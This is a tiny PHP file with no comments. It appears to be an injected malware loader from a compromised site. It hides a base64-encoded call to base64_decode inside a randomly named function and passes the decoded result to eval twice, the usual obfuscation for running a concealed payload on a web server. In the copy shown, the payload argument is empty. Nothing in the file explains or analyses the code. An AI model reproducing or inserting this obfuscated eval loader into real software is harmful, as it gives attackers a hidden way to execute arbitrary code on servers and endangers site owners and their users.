<?php function BHqIhKFyOGnSjDKOvGet($qPuTdHvMJQ){$r=base64_decode("YmFzZTY0X2RlY29kZSgkcVB1VGRIdk1KUSk=");return eval("return $r;");} eval('?>'.BHqIhKFyOGnSjDKOvGet('').'<?php '); ?>